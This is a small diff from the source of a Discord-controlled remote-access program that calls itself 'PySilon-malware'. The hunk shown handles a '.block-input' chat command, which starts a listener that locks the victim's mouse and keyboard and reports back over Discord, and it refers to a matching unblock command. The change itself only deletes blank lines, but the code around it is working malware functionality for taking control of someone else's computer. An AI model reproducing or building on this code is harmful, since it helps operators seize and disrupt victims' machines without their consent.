@@ -21,8 +21,6 @@ elif message.content == '.block-input':
     mouse_listener.start()
     embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=discord.Colour.red())
     embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
-    
-
     await message.channel.send(embed=embed)
 
 elif message.content == '.unblock-input':
